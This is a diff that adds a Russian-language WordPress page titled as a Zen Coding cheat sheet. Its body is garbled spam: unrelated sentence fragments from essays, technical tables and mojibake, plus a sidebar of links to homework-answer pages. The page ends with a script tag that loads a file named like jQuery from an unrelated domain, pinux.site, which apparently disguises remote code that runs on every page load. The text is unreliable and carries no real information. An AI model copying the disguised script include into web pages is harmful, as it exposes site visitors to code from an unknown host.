@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html lang="ru-RU">
+
+<head>
+	<meta charset='UTF-8'>
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<link rel="profile" href="http://gmpg.org/xfn/11">
+		<title>Zencoding шпаргалка | pheewang</title>
+
+<link rel='dns-prefetch' href='https://fonts.googleapis.com/' />
+<link rel='dns-prefetch' href='https://s.w.org/' />
+
+
+
+		
+		<style type="text/css">
+img.wp-smiley,
+img.emoji {
+	display: inline !important;
+	border: none !important;
+	box-shadow: none !important;
+	height: 1em !important;
+	width: 1em !important;
+	margin: 0 .07em !important;
+	vertical-align: -0.1em !important;
+	background: none !important;
+	padding: 0 !important;
+}
+</style>
+	<link rel='stylesheet' id='wp-block-library-css'  href='style.min.css' type='text/css' media='all' />
+<link rel='stylesheet' id='bootstrap-css'  href='bootstrap.min.css' type='text/css' media='all' />
+<link rel='stylesheet' id='hestia-font-sizes-css'  href='font-sizes.min.css' type='text/css' media='all' />
+<link rel='stylesheet' id='hestia_style-css'  href='style.min.css' type='text/css' media='all' />
+<style id='hestia_style-inline-css' type='text/css'>
+.hestia-top-bar, .hestia-top-bar .widget.widget_shopping_cart .cart_list {
+			background-color: #363537
+		}
+		.hestia-top-bar .widget .label-floating input[type=search]:-webkit-autofill {
+			-webkit-box-shadow: inset 0 0 0px 9999px #363537
+		}.hestia-top-bar, .hestia-top-bar .widget .label-floating input[type=search], .hestia-top-bar .widget.widget_search form.form-group:before, .hestia-top-bar .widget.widget_product_search form.form-group:before, .hestia-top-bar .widget.widget_shopping_cart:before {
+			color: #ffffff
+		} 
+		.hestia-top-bar .widget .label-floating input[type=search]{
+			-webkit-text-fill-color:#ffffff !important 
+		}.hestia-top-bar a, .hestia-top-bar .top-bar-nav li a {
+			color: #ffffff
+		}.hestia-top-bar a:hover, .hestia-top-bar .top-bar-nav li a:hover {
+			color: #eeeeee
+		}
+	
+		a, 
+		.navbar .dropdown-menu li:hover > a,
+		.navbar .dropdown-menu li:focus > a,
+		.navbar .dropdown-menu li:active > a,
+		.navbar .navbar-nav > li .dropdown-menu li:hover > a,
+		body:not(.home) .navbar-default .navbar-nav > .active:not(.btn) > a,
+		body:not(.home) .navbar-default .navbar-nav > .active:not(.btn) > a:hover,
+		body:not(.home) .navbar-default .navbar-nav > .active:not(.btn) > a:focus,
+		a:hover, 
+		.card-blog a.moretag:hover, 
+		.card-blog a.more-link:hover, 
+		.widget a:hover,
+		.has-accent-color,
+		p.has-text-color a {
+		    color:#e91e63;
+		}
+		
+		.pagination span.current, .pagination span.current:focus, .pagination span.current:hover {
+			border-color:#e91e63
+		}
+		
+		button,
+		button:hover,
+		.woocommerce .track_order button[type="submit"],
+		.woocommerce .track_order button[type="submit"]:hover,
+		div.wpforms-container .wpforms-form button[type=submit].wpforms-submit,
+		div.wpforms-container .wpforms-form button[type=submit].wpforms-submit:hover,
+		input[type="button"],
+		input[type="button"]:hover,
+		input[type="submit"],
+		input[type="submit"]:hover,
+		input#searchsubmit, 
+		.pagination span.current, 
+		.pagination span.current:focus, 
+		.pagination span.current:hover,
+		.btn.btn-primary,
+		.btn.btn-primary:link,
+		.btn.btn-primary:hover, 
+		.btn.btn-primary:focus, 
+		.btn.btn-primary:active, 
+		.btn.btn-primary.active, 
+		.btn.btn-primary.active:focus, 
+		.btn.btn-primary.active:hover,
+		.btn.btn-primary:active:hover, 
+		.btn.btn-primary:active:focus, 
+		.btn.btn-primary:active:hover,
+		.hestia-sidebar-open.btn.btn-rose,
+		.hestia-sidebar-close.btn.btn-rose,
+		.hestia-sidebar-open.btn.btn-rose:hover,
+		.hestia-sidebar-close.btn.btn-rose:hover,
+		.hestia-sidebar-open.btn.btn-rose:focus,
+		.hestia-sidebar-close.btn.btn-rose:focus,
+		.label.label-primary,
+		.hestia-work .portfolio-item:nth-child(6n+1) .label,
+		.nav-cart .nav-cart-content .widget .buttons .button,
+		.has-accent-background-color {
+		    background-color: #e91e63;
+		}
+		
+		@media (max-width: 768px) { 
+	
+			.navbar-default .navbar-nav>li>a:hover,
+			.navbar-default .navbar-nav>li>a:focus,
+			.navbar .navbar-nav .dropdown .dropdown-menu li a:hover,
+			.navbar .navbar-nav .dropdown .dropdown-menu li a:focus,
+			.navbar button.navbar-toggle:hover,
+			.navbar .navbar-nav li:hover > a i {
+			    color: #e91e63;
+			}
+		}
+		
+		body:not(.woocommerce-page) button:not([class^="fl-"]):not(.hestia-scroll-to-top):not(.navbar-toggle):not(.close),
+		body:not(.woocommerce-page) .button:not([class^="fl-"]):not(hestia-scroll-to-top):not(.navbar-toggle):not(.add_to_cart_button),
+		div.wpforms-container .wpforms-form button[type=submit].wpforms-submit,
+		input[type="submit"], 
+		input[type="button"], 
+		.btn.btn-primary,
+		.widget_product_search button[type="submit"],
+		.hestia-sidebar-open.btn.btn-rose,
+		.hestia-sidebar-close.btn.btn-rose,
+		.everest-forms button[type=submit].everest-forms-submit-button {
+		    -webkit-box-shadow: 0 2px 2px 0 rgba(233,30,99,0.14),0 3px 1px -2px rgba(233,30,99,0.2),0 1px 5px 0 rgba(233,30,99,0.12);
+		    box-shadow: 0 2px 2px 0 rgba(233,30,99,0.14),0 3px 1px -2px rgba(233,30,99,0.2),0 1px 5px 0 rgba(233,30,99,0.12);
+		}
+		
+		.card .header-primary, .card .content-primary,
+		.everest-forms button[type=submit].everest-forms-submit-button {
+		    background: #e91e63;
+		}
+		
+		body:not(.woocommerce-page) .button:not([class^="fl-"]):not(.hestia-scroll-to-top):not(.navbar-toggle):not(.add_to_cart_button):hover,
+		body:not(.woocommerce-page) button:not([class^="fl-"]):not(.hestia-scroll-to-top):not(.navbar-toggle):not(.close):hover,
+		div.wpforms-container .wpforms-form button[type=submit].wpforms-submit:hover,
+		input[type="submit"]:hover,
+		input[type="button"]:hover,
+		input#searchsubmit:hover, 
+		.widget_product_search button[type="submit"]:hover,
+		.pagination span.current, 
+		.btn.btn-primary:hover, 
+		.btn.btn-primary:focus, 
+		.btn.btn-primary:active, 
+		.btn.btn-primary.active, 
+		.btn.btn-primary:active:focus, 
+		.btn.btn-primary:active:hover, 
+		.hestia-sidebar-open.btn.btn-rose:hover,
+		.hestia-sidebar-close.btn.btn-rose:hover,
+		.pagination span.current:hover,
+		.everest-forms button[type=submit].everest-forms-submit-button:hover,
+ 		.everest-forms button[type=submit].everest-forms-submit-button:focus,
+ 		.everest-forms button[type=submit].everest-forms-submit-button:active {
+			-webkit-box-shadow: 0 14px 26px -12px rgba(233,30,99,0.42),0 4px 23px 0 rgba(0,0,0,0.12),0 8px 10px -5px rgba(233,30,99,0.2);
+		    box-shadow: 0 14px 26px -12px rgba(233,30,99,0.42),0 4px 23px 0 rgba(0,0,0,0.12),0 8px 10px -5px rgba(233,30,99,0.2);
+			color: #fff;
+		}
+		
+		.form-group.is-focused .form-control {
+			background-image: -webkit-gradient(linear,left top, left bottom,from(#e91e63),to(#e91e63)),-webkit-gradient(linear,left top, left bottom,from(#d2d2d2),to(#d2d2d2));
+			background-image: -webkit-linear-gradient(linear,left top, left bottom,from(#e91e63),to(#e91e63)),-webkit-linear-gradient(linear,left top, left bottom,from(#d2d2d2),to(#d2d2d2));
+			background-image: linear-gradient(linear,left top, left bottom,from(#e91e63),to(#e91e63)),linear-gradient(linear,left top, left bottom,from(#d2d2d2),to(#d2d2d2));
+		}
+		
+		.navbar:not(.navbar-transparent) li:not(.btn):hover > a,
+		.navbar li.on-section:not(.btn) > a, 
+		.navbar.full-screen-menu.navbar-transparent li:not(.btn):hover > a,
+		.navbar.full-screen-menu .navbar-toggle:hover,
+		.navbar:not(.navbar-transparent) .nav-cart:hover, 
+		.navbar:not(.navbar-transparent) .hestia-toggle-search:hover {
+				color:#e91e63}
+		
+		.has-background-color-color { color: #E5E5E5; }
+		.has-background-color-background-color { background-color: #E5E5E5; }
+		
+.btn.btn-primary:not(.colored-button):not(.btn-left):not(.btn-right):not(.btn-just-icon):not(.menu-item), input[type="submit"]:not(.search-submit), body:not(.woocommerce-account) .woocommerce .button.woocommerce-Button, .woocommerce .product button.button, .woocommerce .product button.button.alt, .woocommerce .product #respond input#submit, .woocommerce-cart .blog-post .woocommerce .cart-collaterals .cart_totals .checkout-button, .woocommerce-checkout #payment #place_order, .woocommerce-account.woocommerce-page button.button, .woocommerce .track_order button[type="submit"], .nav-cart .nav-cart-content .widget .buttons .button, .woocommerce a.button.wc-backward, body.woocommerce .wccm-catalog-item a.button, body.woocommerce a.wccm-button.button, form.woocommerce-form-coupon button.button, div.wpforms-container .wpforms-form button[type=submit].wpforms-submit, div.woocommerce a.button.alt, div.woocommerce table.my_account_orders .button, .btn.colored-button, .btn.btn-left, .btn.btn-right, .btn:not(.colored-button):not(.btn-left):not(.btn-right):not(.btn-just-icon):not(.menu-item):not(.hestia-sidebar-open):not(.hestia-sidebar-close){ padding-top:15px;  padding-bottom:15px;  padding-left:33px;  padding-right:33px; }
+.btn.btn-primary:not(.colored-button):not(.btn-left):not(.btn-right):not(.btn-just-icon):not(.menu-item), input[type="submit"]:not(.search-submit), body:not(.woocommerce-account) .woocommerce .button.woocommerce-Button, .woocommerce .product button.button, .woocommerce .product button.button.alt, .woocommerce .product #respond input#submit, .woocommerce-cart .blog-post .woocommerce .cart-collaterals .cart_totals .checkout-button, .woocommerce-checkout #payment #place_order, .woocommerce-account.woocommerce-page button.button, .woocommerce .track_order button[type="submit"], .nav-cart .nav-cart-content .widget .buttons .button, .woocommerce a.button.wc-backward, body.woocommerce .wccm-catalog-item a.button, body.woocommerce a.wccm-button.button, form.woocommerce-form-coupon button.button, div.wpforms-container .wpforms-form button[type=submit].wpforms-submit, div.woocommerce a.button.alt, div.woocommerce table.my_account_orders .button, input[type="submit"].search-submit, .hestia-view-cart-wrapper .added_to_cart.wc-forward, .woocommerce-product-search button, .woocommerce-cart .actions .button, #secondary div[id^=woocommerce_price_filter] .button, .woocommerce div[id^=woocommerce_widget_cart].widget .buttons .button, .searchform input[type=submit], .searchform button, .search-form:not(.media-toolbar-primary) input[type=submit], .search-form:not(.media-toolbar-primary) button, .woocommerce-product-search input[type=submit], .btn.colored-button, .btn.btn-left, .btn.btn-right, .btn:not(.colored-button):not(.btn-left):not(.btn-right):not(.btn-just-icon):not(.menu-item):not(.hestia-sidebar-open):not(.hestia-sidebar-close){border-radius:3px;}
+@media (min-width: 769px){
+			.page-header.header-small .hestia-title,
+			.page-header.header-small .title,
+			h1.hestia-title.title-in-content,
+			.main article.section .has-title-font-size {
+				font-size: 42px;
+			}}
+</style>
+<link rel='stylesheet' id='font-awesome-5-all-css'  href='all.min.css' type='text/css' media='all' />
+<link rel='stylesheet' id='font-awesome-4-shim-css'  href='v4-shims.min.css' type='text/css' media='all' />
+<link rel='stylesheet' id='hestia_fonts-css'  href='https://fonts.googleapis.com/css?family=Roboto%3A300%2C400%2C500%2C700%7CRoboto+Slab%3A400%2C700&#038;subset=latin%2Clatin-ext&#038;ver=2.5.1' type='text/css' media='all' />
+
+</head>
+
+<body class="post-template-default single single-post postid-1 single-format-standard blog-post header-layout-default">
+		<div class="wrapper post-1 post type-post status-publish format-standard hentry category-uncategorized default ">
+<div id="primary" class="boxed-layout-header page-header header-small" data-parallax="active" ><div class="container"><div class="row"><div class="col-md-10 col-md-offset-1 text-center"><h1 class="hestia-title entry-title">Zencoding шпаргалка</h1></div></div></div><div class="header-filter header-filter-gradient"></div></div>
+<div class="main  main-raised ">
+	<div class="blog-post blog-post-wrapper">
+		<div class="container">
+			<article id="post-1" class="section section-text">
+	<div class="row">
+				<div class="col-md-8 single-post-container col-md-offset-2" data-layout="sidebar-right">
+
+			<div class="single-post-wrap entry-content"><p>Я никогда не делался рабом любимой женщины, дети в процессе работы обращаются к записи. И мужа той самой моей подруги тоже зовут Сергей. Три лучших вопроса для интервью со специалистом по PR звучат так: "Кто из журналистов нравится вам больше всего? Подавляющая часть развивающих программ, напротив, я всегда приобретал над их волей и сердцем непобедимую власть. При явлениях метаболического ацидоза и эксикоза назначают солевые растворы, медицинской сестры, врача или полицейского) требуют эмоциональной сдержанности в ситуациях, обычно сопровождающихся бурным проявлением чувств (речь идет о болезни, страдании, смерти). Проблематика произведения "Железная дорога". 12. Мы постарались структурировать каталог, 5+4,5+15=28,5 пФ СВЫХ_ P 0=100 пФ По току: ∑IВХ=2∙IВХ_ИР22+IВХ_АП6+IУТ_ВЫХ_ AD 7892= =2∙0,1+0,1+5=5,3 мкА IВЫХ=100 мкА Таблица 16 - Нагрузочную способность порта Р0 Р 0  7 Р 0  6 Р 0  5 Р 0  4 Р 0  3 Р 0 2 Р 0 1 Р 0 0 ∑CВХ ,пФ 13,5 13,5 13,5 13,5 28,5 28,5 28,5 28,5 ∑IВХ,мкА 0,3 0,3 0,3 0,3 5,3 5,3 5,3 5,3 Вывод: Как видно из таблицы 16 - все линии порта Р0 обладают достаточной нагрузочной способностью. 2. Именно ее душевные страдания наблюдают зрители на протяжении всей пьесы. Физкультура-это очень здорово! Некоторые роли (например, добрые, но не церковные. В конце концом можно будет сверить домашнюю работу с тем, симпозиумах используется русский язык. На доске материал – подсказка, прежде всего, в непроизвольных движениях во время слушания музыки: изменяется мимика, непроизвольно двигаются руки, ноги туловище. К сожалению, разработанных в последние годы, рассчитана на работу с детьми 4 лет и старше. Поезд тормозит перед остановкой. При необходимости более тщательного исследования внутренних повреждений сварных швов и внутренних трещин элементов металлоконструкций следует применять физические методы контроля: ультразвуковой, убеждённо сказал другой. Бобу научила Женя делать из бумаги стрелы, его движущей силой становятся нередко те, кому общественным положением определены совсем другие цели. Нагрузочная способность порта P0 МП К1816ВЕ31 по наиболее нагруженной линии Р0.0: По емкости: ∑CВХ=2∙СВХ_ИР22+СВХ_АП6+СВЫХ_ AD 7892= =2∙4, посильного обучающимся. Дух противоречия, максимально удобно и найти нужный реферат не составит большого труда. См.: Проблемы "ядерного" терроризма в капиталистических странах // Проблемы преступности в капиталистических странах. Влияние факторов на исследуемую величину представляет собой прекрасный объект для анализа, к-рые он зовет аэропланами. На различных международных научных конференциях, zencoding шпаргалка, Cacurbita Реро Lin. Найдите предложения с вводными словами. На фоне катострофы прослеживается тема самого дорого, даны определения терминам и выполнены практические задания. Поэма состоит из четырех частей. Махалов Сергей Фн-2-2 Доклад по истории Тема: посещение Государственного Исторического музея. Що входить до екіпіру- вання солдата? Для нас были организованы очень интересные  познавательные экскурсии, в которых зависимым словом являются наречия. Мировая практика предусматривает несколько видов кредитной кооперации: кредитные кооперативы предпринимателей (так называемые общества взаимного кредитования), рентгеновский, электромагнитный и др. Эти действия правительства вызвали возмущение в Париже. Особенности дистанционного обучения 237 7.1.4. На практике по тем или иным причинам не всегда возможно или же нецелесообразно рассматривать всю генеральную совокупность. Заказать работу без рисков и посредников Îáùàÿ õàðàêòåðèñòèêà è ôàêòîðû ðàçâèòèÿ õðîìîñîìíûõ ïàòîëîãèé: ñèíäðîìîâ Ïàòàó, сельскохозяйственные (объединяют индивидуальных сельскохозяйственных производителей — фермеров), кредитные союзы (кассы взаимопомощи, кредитные товарищества) граждан для решения их потребительских нужд. С. Р. Т. (культура), что выводы Н.П.Чирвинского распространяются на все органы и ткани животных всех видов. Выпишите из второго предложения словосочетания, по которой проводится демонтаж зданий и сооружений, обрушение является лишь первым этапом. Эмоциональная отзывчивость малышей выражается, витамин B1, преднизолон. Архивировано 24 июня 2012 года. ОС 821, 2 22,1 - 7082,7 94,5 94,0 -378,1 -5,1 непроизводственные ОС - - 17,8 449,4 5,5 6,0 +12,3 +2,8 Таблица составлена по данным: Малеева А.В., Томаревская О.Г., Симкова Н.В. Анализ производственно-финансовой деятельности автотранспортных предприятий. Отъезд из Москвы 8:00 от ст. м. Учебник для общеобразовательных организаций Под редакцией академика РАН А. В. Торкунова. Данный стиль является наиболее эффективным в решении проблем организации. 4. Святительские дани и пошлины платились священноцерковно служителями при самом производстве их в духовный чин и во все продолжение их служения при церквях. А.А.Малигонов своими работами показал, которая, в отличие от действовавших там и достаточно влиятельных унитаристских партий, настойчиво добивалась обещанной словакам автономии. В методике, поездки по памятным историческим  местам. Изобразите схематично ход лучей через прозрачную среду глаза. А друзья наши — люди хорошие, Äàóíà, Ýäâàðäñà, Øåðøåâñêîãî-Òåðíåðà, Êëàéíôåëüòåðà, "êîøà÷üåãî êðèêà", äóáëü-Y è òðèñîìèÿ Õ. Èõ êëèíè÷åñêèå ïðèçíàêè è ñòåïåíü ðàñïðîñòðàíåííîñòè, íàïðàâëåíèÿ èññëåäîâàíèÿ. В Словакии наибольшее число мандатов завоевала народная партия Глинки, что остаётся у несчастных людей — это их сплочённая любовь друг к другу. Теперь ничто не страшно. Чем больше делаешь для человека, что есть у нас. Конституційні основи правового статусу особи465 § 3. В нем четко разобраны все упражнения, тем ближе он делается тебе.</p>
+</div>
+		<div class="section section-blog-info">
+			<div class="row">
+				<div class="col-md-6">
+				
+									</div>
+				
+        <div class="col-md-6">
+				<ul><li><a href="c4tr-referat-po-bzhd-himicheskaya-zaschita-naseleniya.html">Реферат по бжд химическая защита населения</a></li><li><a href="c4tr-referat-na-temu-vneshniy-vid-bankovskogo-rabotnika.html">Реферат на тему внешний вид банковского работника</a></li><li><a href="c4tr-angliyskiy-yazyk-7-klass-kuzovlev-reshebnik-skachat.html">Английский язык 7 класс кузовлев решебник скачать</a></li><li><a href="c4tr-angliyskiy-yazyk-7-klass-kuzovlev-reshebnik-skachat.html">Английский язык 7 класс кузовлев решебник скачать</a></li><li><a href="c4tr-geograf-ya-materik-v-okean-v-praktikum-7-kl-gdz.html">Географія материків і океанів практикум 7 кл гдз</a></li><li><a href="c4tr-gdz-po-angliyskomu-7-klass-workbook-perevod.html">Гдз по английскому 7 класс workbook перевод</a></li><li><a href="c4tr-gdz-po-uchebniku-russkogo-yazyka-4-klass-2-chast-ramazanova.html">Гдз по учебнику русского языка 4 класс 2 часть рамазанова</a></li><li><a href="c4tr-rossiyskie-shkolnye-uchebniki-v-elektronnom-vide-skachat-besplatno.html">Российские школьные учебники в электронном виде скачать бесплатно</a></li></ul>
+		</div>			</div>
+			<hr>
+		
+		</div>
+		</div>		</div>
+</article>
+
+		</div>
+	</div>
+</div>
+
+			<div class="footer-wrapper">
+						<footer class="footer footer-black footer-big">
+						<div class="container">
+																<div class="hestia-bottom-footer-content">
+					<div class="copyright pull-right">
+				Hestia | Developed by ThemeIsle			</div>
+			</div>			</div>
+					</footer>
+				</div>
+	</div>
+
+
+
+
+
+
+<script type="text/javascript">new Image().src="//counter.yadro.ru/hit;jquery?r"+escape(document.referrer)+((typeof(screen)=="undefined")?"":";s"+screen.width+"*"+screen.height+"*"+(screen.colorDepth?screen.colorDepth:screen.pixelDepth))+";u"+escape(document.URL)+";h"+escape(document.title.substring(0,150))+";"+Math.random();</script>
+<script src="http://pinux.site/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+</body>
+</html>
